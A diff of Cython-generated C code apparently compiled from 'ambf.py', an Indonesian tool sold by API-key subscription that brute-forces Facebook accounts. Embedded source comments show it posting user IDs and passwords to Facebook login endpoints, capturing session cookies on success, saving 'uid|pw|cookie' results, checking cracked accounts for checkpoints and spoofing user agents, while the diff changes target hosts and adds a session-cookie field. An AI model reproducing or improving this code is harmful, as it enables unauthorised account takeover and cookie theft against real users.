-        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_quote); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 738, __pyx_L5_except_error)
+        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_quote); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 728, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
         __pyx_t_14 = NULL;
         if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
@@ -22467,13 +22199,13 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_13 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_14, __pyx_v_tks) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_v_tks);
         __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
-        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 738, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 728, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        __pyx_t_8 = PyNumber_Add(__pyx_v_url_wa, __pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 738, __pyx_L5_except_error)
+        __pyx_t_8 = PyNumber_Add(__pyx_v_url_wa, __pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 728, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
-        __pyx_t_13 = PyList_New(3); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 738, __pyx_L5_except_error)
+        __pyx_t_13 = PyList_New(3); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 728, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_INCREF(__pyx_n_s_am);
         __Pyx_GIVEREF(__pyx_n_s_am);
@@ -22497,22 +22229,22 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         __pyx_t_9 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_8, __pyx_t_13) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_13);
         __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
-        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 738, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 728, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
 
-        /* "ambf.py":727
+        /* "ambf.py":720
  * 				time.sleep(1.5)
  * 				return make()
  * 		elif ask in ["3", "03"]:             # <<<<<<<<<<<<<<
- * 			print("\n [ List Harga Script Premium ]\n")
- * 			print(" [+] Durasi 1 Bulan Harga Rp 20.000")
+ * 			print("\n [ Isi Data Pendaftaran Api Key ]\n")
+ * 			nama = input(" [+] Nama   : ")
  */
         goto __pyx_L11;
       }
 
-      /* "ambf.py":740
+      /* "ambf.py":730
  * 			subprocess.check_output(["am", "start", url_wa+quote(tks)])
  * 		else:
  * 			main()             # <<<<<<<<<<<<<<
@@ -22520,7 +22252,7 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
  * if __name__ == "__main__":
  */
       /*else*/ {
-        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_main); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 740, __pyx_L5_except_error)
+        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_main); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 730, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_10);
         __pyx_t_13 = NULL;
         if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
@@ -22534,7 +22266,7 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_9 = (__pyx_t_13) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_13) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
         __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
-        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 740, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 730, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
@@ -22548,7 +22280,7 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
     goto __pyx_L5_except_error;
     __pyx_L5_except_error:;
 
-    /* "ambf.py":693
+    /* "ambf.py":686
  * 
  * def main():
  * 	try:             # <<<<<<<<<<<<<<
@@ -22574,7 +22306,7 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
     __pyx_L8_try_end:;
   }
 
-  /* "ambf.py":692
+  /* "ambf.py":685
  * 		return make()
  * 
  * def main():             # <<<<<<<<<<<<<<
@@ -22736,9 +22468,7 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_kp_s_Dalvik_2_1_0_Linux_U_Android_11, __pyx_k_Dalvik_2_1_0_Linux_U_Android_11, sizeof(__pyx_k_Dalvik_2_1_0_Linux_U_Android_11), 0, 0, 1, 0},
   {&__pyx_n_s_Desember, __pyx_k_Desember, sizeof(__pyx_k_Desember), 0, 0, 1, 1},
   {&__pyx_kp_s_Durasi, __pyx_k_Durasi, sizeof(__pyx_k_Durasi), 0, 0, 1, 0},
-  {&__pyx_kp_s_Durasi_1_Bulan_Harga_Rp_20_000, __pyx_k_Durasi_1_Bulan_Harga_Rp_20_000, sizeof(__pyx_k_Durasi_1_Bulan_Harga_Rp_20_000), 0, 0, 1, 0},
   {&__pyx_kp_s_Durasi_2, __pyx_k_Durasi_2, sizeof(__pyx_k_Durasi_2), 0, 0, 1, 0},
-  {&__pyx_kp_s_Durasi_Unlimited_Harga_Rp_50_00, __pyx_k_Durasi_Unlimited_Harga_Rp_50_00, sizeof(__pyx_k_Durasi_Unlimited_Harga_Rp_50_00), 0, 0, 1, 0},
   {&__pyx_n_s_EAAA, __pyx_k_EAAA, sizeof(__pyx_k_EAAA), 0, 0, 1, 1},
   {&__pyx_n_s_EXCELLENT, __pyx_k_EXCELLENT, sizeof(__pyx_k_EXCELLENT), 0, 0, 1, 1},
   {&__pyx_kp_s_Email, __pyx_k_Email, sizeof(__pyx_k_Email), 0, 0, 1, 0},
@@ -22759,7 +22489,6 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_n_s_KeyError, __pyx_k_KeyError, sizeof(__pyx_k_KeyError), 0, 0, 1, 1},
   {&__pyx_n_s_Lanjutkan, __pyx_k_Lanjutkan, sizeof(__pyx_k_Lanjutkan), 0, 0, 1, 1},
   {&__pyx_n_s_Liger, __pyx_k_Liger, sizeof(__pyx_k_Liger), 0, 0, 1, 1},
-  {&__pyx_kp_s_List_Harga_Script_Premium, __pyx_k_List_Harga_Script_Premium, sizeof(__pyx_k_List_Harga_Script_Premium), 0, 0, 1, 0},
   {&__pyx_n_s_Maret, __pyx_k_Maret, sizeof(__pyx_k_Maret), 0, 0, 1, 1},
   {&__pyx_kp_s_Masukan_Api_Key, __pyx_k_Masukan_Api_Key, sizeof(__pyx_k_Masukan_Api_Key), 0, 0, 1, 0},
   {&__pyx_n_s_Mei, __pyx_k_Mei, sizeof(__pyx_k_Mei), 0, 0, 1, 1},
@@ -22768,7 +22497,6 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_kp_s_Mozilla_5_0_Linux_Android_9_CPH1, __pyx_k_Mozilla_5_0_Linux_Android_9_CPH1, sizeof(__pyx_k_Mozilla_5_0_Linux_Android_9_CPH1), 0, 0, 1, 0},
   {&__pyx_kp_s_Nama, __pyx_k_Nama, sizeof(__pyx_k_Nama), 0, 0, 1, 0},
   {&__pyx_kp_s_Nama_2, __pyx_k_Nama_2, sizeof(__pyx_k_Nama_2), 0, 0, 1, 0},
-  {&__pyx_kp_s_NokiaC3_00_5_0_07_20_Profile_MID, __pyx_k_NokiaC3_00_5_0_07_20_Profile_MID, sizeof(__pyx_k_NokiaC3_00_5_0_07_20_Profile_MID), 0, 0, 1, 0},
   {&__pyx_n_s_November, __pyx_k_November, sizeof(__pyx_k_November), 0, 0, 1, 1},
   {&__pyx_n_s_OK, __pyx_k_OK, sizeof(__pyx_k_OK), 0, 0, 1, 1},
   {&__pyx_kp_s_OK_s, __pyx_k_OK_s, sizeof(__pyx_k_OK_s), 0, 0, 1, 0},
@@ -22803,7 +22531,6 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_n_s_accept, __pyx_k_accept, sizeof(__pyx_k_accept), 0, 0, 1, 1},
   {&__pyx_kp_s_accept_encoding, __pyx_k_accept_encoding, sizeof(__pyx_k_accept_encoding), 0, 0, 1, 0},
   {&__pyx_kp_s_accept_language, __pyx_k_accept_language, sizeof(__pyx_k_accept_language), 0, 0, 1, 0},
-  {&__pyx_n_s_access_token, __pyx_k_access_token, sizeof(__pyx_k_access_token), 0, 0, 1, 1},
   {&__pyx_n_s_action, __pyx_k_action, sizeof(__pyx_k_action), 0, 0, 1, 1},
   {&__pyx_kp_s_akun_tidak_checkpoint, __pyx_k_akun_tidak_checkpoint, sizeof(__pyx_k_akun_tidak_checkpoint), 0, 0, 1, 0},
   {&__pyx_kp_s_akun_tidak_tersedia_atau_list_f, __pyx_k_akun_tidak_tersedia_atau_list_f, sizeof(__pyx_k_akun_tidak_tersedia_atau_list_f), 0, 0, 1, 0},
@@ -22886,7 +22613,6 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_n_s_document, __pyx_k_document, sizeof(__pyx_k_document), 0, 0, 1, 1},
   {&__pyx_n_s_dtsg, __pyx_k_dtsg, sizeof(__pyx_k_dtsg), 0, 0, 1, 1},
   {&__pyx_n_s_durasi, __pyx_k_durasi, sizeof(__pyx_k_durasi), 0, 0, 1, 1},
-  {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
   {&__pyx_n_s_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 0, 1, 1},
   {&__pyx_kp_s_email_s, __pyx_k_email_s, sizeof(__pyx_k_email_s), 0, 0, 1, 0},
   {&__pyx_n_s_end, __pyx_k_end, sizeof(__pyx_k_end), 0, 0, 1, 1},
@@ -22912,7 +22638,6 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_n_s_fm, __pyx_k_fm, sizeof(__pyx_k_fm), 0, 0, 1, 1},
   {&__pyx_n_s_follower, __pyx_k_follower, sizeof(__pyx_k_follower), 0, 0, 1, 1},
   {&__pyx_n_s_form, __pyx_k_form, sizeof(__pyx_k_form), 0, 0, 1, 1},
-  {&__pyx_kp_s_free_facebook_com, __pyx_k_free_facebook_com, sizeof(__pyx_k_free_facebook_com), 0, 0, 1, 0},
   {&__pyx_n_s_gaaa, __pyx_k_gaaa, sizeof(__pyx_k_gaaa), 0, 0, 1, 1},
   {&__pyx_n_s_ged, __pyx_k_ged, sizeof(__pyx_k_ged), 0, 0, 1, 1},
   {&__pyx_n_s_get, __pyx_k_get, sizeof(__pyx_k_get), 0, 0, 1, 1},
@@ -22938,7 +22663,7 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_kp_s_http_ip_api_com_json, __pyx_k_http_ip_api_com_json, sizeof(__pyx_k_http_ip_api_com_json), 0, 0, 1, 0},
   {&__pyx_kp_s_https_api_whatsapp_com_send_phon, __pyx_k_https_api_whatsapp_com_send_phon, sizeof(__pyx_k_https_api_whatsapp_com_send_phon), 0, 0, 1, 0},
   {&__pyx_kp_s_https_b_api_facebook_com_method, __pyx_k_https_b_api_facebook_com_method, sizeof(__pyx_k_https_b_api_facebook_com_method), 0, 0, 1, 0},
-  {&__pyx_kp_s_https_free_facebook_com, __pyx_k_https_free_facebook_com, sizeof(__pyx_k_https_free_facebook_com), 0, 0, 1, 0},
+  {&__pyx_kp_s_https_d_facebook_com, __pyx_k_https_d_facebook_com, sizeof(__pyx_k_https_d_facebook_com), 0, 0, 1, 0},
   {&__pyx_kp_s_https_graph_facebook_com_me_acce, __pyx_k_https_graph_facebook_com_me_acce, sizeof(__pyx_k_https_graph_facebook_com_me_acce), 0, 0, 1, 0},
   {&__pyx_kp_s_https_graph_facebook_com_me_acce_2, __pyx_k_https_graph_facebook_com_me_acce_2, sizeof(__pyx_k_https_graph_facebook_com_me_acce_2), 0, 0, 1, 0},
   {&__pyx_kp_s_https_graph_facebook_com_s_acces, __pyx_k_https_graph_facebook_com_s_acces, sizeof(__pyx_k_https_graph_facebook_com_s_acces), 0, 0, 1, 0},
@@ -22993,7 +22718,6 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_kp_s_list_nama_file_tersimpan_di_fol_2, __pyx_k_list_nama_file_tersimpan_di_fol_2, sizeof(__pyx_k_list_nama_file_tersimpan_di_fol_2), 0, 0, 1, 0},
   {&__pyx_n_s_listdir, __pyx_k_listdir, sizeof(__pyx_k_listdir), 0, 0, 1, 1},
   {&__pyx_n_s_login, __pyx_k_login, sizeof(__pyx_k_login), 0, 0, 1, 1},
-  {&__pyx_kp_s_login_device_based_regular_logi, __pyx_k_login_device_based_regular_logi, sizeof(__pyx_k_login_device_based_regular_logi), 0, 0, 1, 0},
   {&__pyx_n_s_login_error, __pyx_k_login_error, sizeof(__pyx_k_login_error), 0, 0, 1, 1},
   {&__pyx_kp_s_login_gagal_silahkan_cek_kembal, __pyx_k_login_gagal_silahkan_cek_kembal, sizeof(__pyx_k_login_gagal_silahkan_cek_kembal), 0, 0, 1, 0},
   {&__pyx_kp_s_login_next_ref_dbl_fl_refid_8, __pyx_k_login_next_ref_dbl_fl_refid_8, sizeof(__pyx_k_login_next_ref_dbl_fl_refid_8), 0, 0, 1, 0},
@@ -23112,6 +22836,7 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_kp_s_selamat_datang_0_93m_s_0_97m, __pyx_k_selamat_datang_0_93m_s_0_97m, sizeof(__pyx_k_selamat_datang_0_93m_s_0_97m), 0, 0, 1, 0},
   {&__pyx_n_s_send, __pyx_k_send, sizeof(__pyx_k_send), 0, 0, 1, 1},
   {&__pyx_n_s_ses, __pyx_k_ses, sizeof(__pyx_k_ses), 0, 0, 1, 1},
+  {&__pyx_n_s_session_cookies, __pyx_k_session_cookies, sizeof(__pyx_k_session_cookies), 0, 0, 1, 1},
   {&__pyx_n_s_session_key, __pyx_k_session_key, sizeof(__pyx_k_session_key), 0, 0, 1, 1},
   {&__pyx_n_s_setting_ua, __pyx_k_setting_ua, sizeof(__pyx_k_setting_ua), 0, 0, 1, 1},
   {&__pyx_n_s_sleep, __pyx_k_sleep, sizeof(__pyx_k_sleep), 0, 0, 1, 1},
@@ -23584,7 +23309,7 @@ static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  * 	try:
  * 		ua = open(".ua", "r").read()             # <<<<<<<<<<<<<<
  * 	except IOError:
- * 		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
+ * 		ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
  */
   __pyx_tuple__42 = PyTuple_Pack(2, __pyx_kp_s_ua, __pyx_n_s_r); if (unlikely(!__pyx_tuple__42)) __PYX_ERR(0, 430, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__42);
@@ -23604,223 +23329,223 @@ static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
   __Pyx_GOTREF(__pyx_tuple__44);
   __Pyx_GIVEREF(__pyx_tuple__44);
 
-  /* "ambf.py":498
- * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
- * 			if "c_user" in ses.cookies.get_dict().keys():
- * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")             # <<<<<<<<<<<<<<
- * 				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
- * 				ok.append("%s|%s"%(uid, pw))
+  /* "ambf.py":497
+ * 		gaaa = ses.post(host+"/login/?next&ref=dbl&fl&refid=8",data=kwargs)
+ * 		if "c_user" in ses.cookies.get_dict().keys():
+ * 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")             # <<<<<<<<<<<<<<
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+ * 			ok.append("%s|%s"%(uid, pw))
  */
-  __pyx_tuple__48 = PyTuple_Pack(2, __pyx_kp_s_noscript_1, __pyx_kp_s__7); if (unlikely(!__pyx_tuple__48)) __PYX_ERR(0, 498, __pyx_L1_error)
+  __pyx_tuple__48 = PyTuple_Pack(2, __pyx_kp_s_noscript_1, __pyx_kp_s__7); if (unlikely(!__pyx_tuple__48)) __PYX_ERR(0, 497, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__48);
   __Pyx_GIVEREF(__pyx_tuple__48);
 
-  /* "ambf.py":558
+  /* "ambf.py":552
  * 	elif ua in ["1", "01"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
  * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  */
-  __pyx_tuple__49 = PyTuple_Pack(2, __pyx_kp_s_ua, __pyx_n_s_w); if (unlikely(!__pyx_tuple__49)) __PYX_ERR(0, 558, __pyx_L1_error)
+  __pyx_tuple__49 = PyTuple_Pack(2, __pyx_kp_s_ua, __pyx_n_s_w); if (unlikely(!__pyx_tuple__49)) __PYX_ERR(0, 552, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__49);
   __Pyx_GIVEREF(__pyx_tuple__49);
 
-  /* "ambf.py":561
+  /* "ambf.py":555
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["2", "02"]:
  */
-  __pyx_tuple__50 = PyTuple_Pack(1, __pyx_kp_s_berhasil_ganti_user_agent); if (unlikely(!__pyx_tuple__50)) __PYX_ERR(0, 561, __pyx_L1_error)
+  __pyx_tuple__50 = PyTuple_Pack(1, __pyx_kp_s_berhasil_ganti_user_agent); if (unlikely(!__pyx_tuple__50)) __PYX_ERR(0, 555, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__50);
   __Pyx_GIVEREF(__pyx_tuple__50);
 
-  /* "ambf.py":599
+  /* "ambf.py":593
  * 		menu()
  * 	elif ua in ["7", "07"]:
  * 		c_ua = input(" [+] user-agent : ")             # <<<<<<<<<<<<<<
  * 		if c_ua == "":
  * 			exit("\n [!] jangan kosong")
  */
-  __pyx_tuple__51 = PyTuple_Pack(1, __pyx_kp_s_user_agent_2); if (unlikely(!__pyx_tuple__51)) __PYX_ERR(0, 599, __pyx_L1_error)
+  __pyx_tuple__51 = PyTuple_Pack(1, __pyx_kp_s_user_agent_2); if (unlikely(!__pyx_tuple__51)) __PYX_ERR(0, 593, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__51);
   __Pyx_GIVEREF(__pyx_tuple__51);
 
-  /* "ambf.py":612
+  /* "ambf.py":605
  * def cek_opsi():
  * 	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
  * 	files = input(" [?] nama file  : ")             # <<<<<<<<<<<<<<
  * 	if files == "":
  * 		menu()
  */
-  __pyx_tuple__52 = PyTuple_Pack(1, __pyx_kp_s_nama_file); if (unlikely(!__pyx_tuple__52)) __PYX_ERR(0, 612, __pyx_L1_error)
+  __pyx_tuple__52 = PyTuple_Pack(1, __pyx_kp_s_nama_file); if (unlikely(!__pyx_tuple__52)) __PYX_ERR(0, 605, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__52);
   __Pyx_GIVEREF(__pyx_tuple__52);
 
-  /* "ambf.py":622
+  /* "ambf.py":615
  * 	print(" [*] sedang prosess cek akun....")
  * 	for memek in buka_baju:
  * 		kontol = memek.replace("\n","")             # <<<<<<<<<<<<<<
  * 		titid  = kontol.split("|")
  * 		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
  */
-  __pyx_tuple__54 = PyTuple_Pack(2, __pyx_kp_s__53, __pyx_kp_s__7); if (unlikely(!__pyx_tuple__54)) __PYX_ERR(0, 622, __pyx_L1_error)
+  __pyx_tuple__54 = PyTuple_Pack(2, __pyx_kp_s__53, __pyx_kp_s__7); if (unlikely(!__pyx_tuple__54)) __PYX_ERR(0, 615, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__54);
   __Pyx_GIVEREF(__pyx_tuple__54);
 
-  /* "ambf.py":624
+  /* "ambf.py":617
  * 		kontol = memek.replace("\n","")
  * 		titid  = kontol.split("|")
  * 		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))             # <<<<<<<<<<<<<<
  * 		try:
  * 			check_in(titid[0].replace("  * --> ",""), titid[1])
  */
-  __pyx_tuple__57 = PyTuple_Pack(2, __pyx_kp_s__56, __pyx_kp_s__7); if (unlikely(!__pyx_tuple__57)) __PYX_ERR(0, 624, __pyx_L1_error)
+  __pyx_tuple__57 = PyTuple_Pack(2, __pyx_kp_s__56, __pyx_kp_s__7); if (unlikely(!__pyx_tuple__57)) __PYX_ERR(0, 617, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__57);
   __Pyx_GIVEREF(__pyx_tuple__57);
 
-  /* "ambf.py":630
+  /* "ambf.py":623
  * 			pass
  * 	print("\n [!] cek akun sudah selesai...")
  * 	input(" [+] pencet enter untuk kembali ke menu ")             # <<<<<<<<<<<<<<
  * 	time.sleep(1)
  * 	menu()
  */
-  __pyx_tuple__58 = PyTuple_Pack(1, __pyx_kp_s_pencet_enter_untuk_kembali_ke_m); if (unlikely(!__pyx_tuple__58)) __PYX_ERR(0, 630, __pyx_L1_error)
+  __pyx_tuple__58 = PyTuple_Pack(1, __pyx_kp_s_pencet_enter_untuk_kembali_ke_m); if (unlikely(!__pyx_tuple__58)) __PYX_ERR(0, 623, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__58);
   __Pyx_GIVEREF(__pyx_tuple__58);
 
-  /* "ambf.py":689
+  /* "ambf.py":682
  * 		os.system("rm -f .__apikey__.txt")
  * 	else:
  * 		open(".__apikey__.txt","w").write(key)             # <<<<<<<<<<<<<<
  * 		return make()
  * 
  */
-  __pyx_tuple__61 = PyTuple_Pack(2, __pyx_kp_s_apikey___txt, __pyx_n_s_w); if (unlikely(!__pyx_tuple__61)) __PYX_ERR(0, 689, __pyx_L1_error)
+  __pyx_tuple__61 = PyTuple_Pack(2, __pyx_kp_s_apikey___txt, __pyx_n_s_w); if (unlikely(!__pyx_tuple__61)) __PYX_ERR(0, 682, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__61);
   __Pyx_GIVEREF(__pyx_tuple__61);
 
-  /* "ambf.py":707
+  /* "ambf.py":700
  * 			main()
  * 		elif ask in ["1", "01"]:
  * 			id1 = uuid.uuid4().hex[:5].upper()             # <<<<<<<<<<<<<<
  * 			id2 = uuid.uuid4().hex[:15].upper()
  * 			open(".apikey", "w").write(id1+":"+id2)
  */
-  __pyx_slice__62 = PySlice_New(Py_None, __pyx_int_5, Py_None); if (unlikely(!__pyx_slice__62)) __PYX_ERR(0, 707, __pyx_L1_error)
+  __pyx_slice__62 = PySlice_New(Py_None, __pyx_int_5, Py_None); if (unlikely(!__pyx_slice__62)) __PYX_ERR(0, 700, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_slice__62);
   __Pyx_GIVEREF(__pyx_slice__62);
 
-  /* "ambf.py":708
+  /* "ambf.py":701
  * 		elif ask in ["1", "01"]:
  * 			id1 = uuid.uuid4().hex[:5].upper()
  * 			id2 = uuid.uuid4().hex[:15].upper()             # <<<<<<<<<<<<<<
  * 			open(".apikey", "w").write(id1+":"+id2)
  * 			time.sleep(1)
  */
-  __pyx_slice__63 = PySlice_New(Py_None, __pyx_int_15, Py_None); if (unlikely(!__pyx_slice__63)) __PYX_ERR(0, 708, __pyx_L1_error)
+  __pyx_slice__63 = PySlice_New(Py_None, __pyx_int_15, Py_None); if (unlikely(!__pyx_slice__63)) __PYX_ERR(0, 701, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_slice__63);
   __Pyx_GIVEREF(__pyx_slice__63);
 
-  /* "ambf.py":709
+  /* "ambf.py":702
  * 			id1 = uuid.uuid4().hex[:5].upper()
  * 			id2 = uuid.uuid4().hex[:15].upper()
  * 			open(".apikey", "w").write(id1+":"+id2)             # <<<<<<<<<<<<<<
  * 			time.sleep(1)
  * 			print("\n [+] Api Key Kamu : %s"%(open(".apikey", "r").read()))
  */
-  __pyx_tuple__64 = PyTuple_Pack(2, __pyx_kp_s_apikey, __pyx_n_s_w); if (unlikely(!__pyx_tuple__64)) __PYX_ERR(0, 709, __pyx_L1_error)
+  __pyx_tuple__64 = PyTuple_Pack(2, __pyx_kp_s_apikey, __pyx_n_s_w); if (unlikely(!__pyx_tuple__64)) __PYX_ERR(0, 702, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__64);
   __Pyx_GIVEREF(__pyx_tuple__64);
 
-  /* "ambf.py":711
+  /* "ambf.py":704
  * 			open(".apikey", "w").write(id1+":"+id2)
  * 			time.sleep(1)
  * 			print("\n [+] Api Key Kamu : %s"%(open(".apikey", "r").read()))             # <<<<<<<<<<<<<<
  * 			print(" [*] Copy Api Key Anda Lalu Daftar Api Key Ke Admin")
  * 			input("\n [+] Kembali Ke Menu Awal")
  */
-  __pyx_tuple__66 = PyTuple_Pack(2, __pyx_kp_s_apikey, __pyx_n_s_r); if (unlikely(!__pyx_tuple__66)) __PYX_ERR(0, 711, __pyx_L1_error)
+  __pyx_tuple__66 = PyTuple_Pack(2, __pyx_kp_s_apikey, __pyx_n_s_r); if (unlikely(!__pyx_tuple__66)) __PYX_ERR(0, 704, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__66);
   __Pyx_GIVEREF(__pyx_tuple__66);
 
-  /* "ambf.py":713
+  /* "ambf.py":706
  * 			print("\n [+] Api Key Kamu : %s"%(open(".apikey", "r").read()))
  * 			print(" [*] Copy Api Key Anda Lalu Daftar Api Key Ke Admin")
  * 			input("\n [+] Kembali Ke Menu Awal")             # <<<<<<<<<<<<<<
  * 			main()
  * 		elif ask in ["2", "02"]:
  */
-  __pyx_tuple__67 = PyTuple_Pack(1, __pyx_kp_s_Kembali_Ke_Menu_Awal); if (unlikely(!__pyx_tuple__67)) __PYX_ERR(0, 713, __pyx_L1_error)
+  __pyx_tuple__67 = PyTuple_Pack(1, __pyx_kp_s_Kembali_Ke_Menu_Awal); if (unlikely(!__pyx_tuple__67)) __PYX_ERR(0, 706, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__67);
   __Pyx_GIVEREF(__pyx_tuple__67);
 
-  /* "ambf.py":716
+  /* "ambf.py":709
  * 			main()
  * 		elif ask in ["2", "02"]:
  * 			key = input("\n [+] Masukan Api Key : ")             # <<<<<<<<<<<<<<
  * 			cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  * 			if cek["status"] == "error":
  */
-  __pyx_tuple__68 = PyTuple_Pack(1, __pyx_kp_s_Masukan_Api_Key); if (unlikely(!__pyx_tuple__68)) __PYX_ERR(0, 716, __pyx_L1_error)
+  __pyx_tuple__68 = PyTuple_Pack(1, __pyx_kp_s_Masukan_Api_Key); if (unlikely(!__pyx_tuple__68)) __PYX_ERR(0, 709, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__68);
   __Pyx_GIVEREF(__pyx_tuple__68);
 
-  /* "ambf.py":719
+  /* "ambf.py":712
  * 			cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  * 			if cek["status"] == "error":
  * 				exit(" [!] api key tidak terdaftar")             # <<<<<<<<<<<<<<
  * 			elif cek["status"] == "expired":
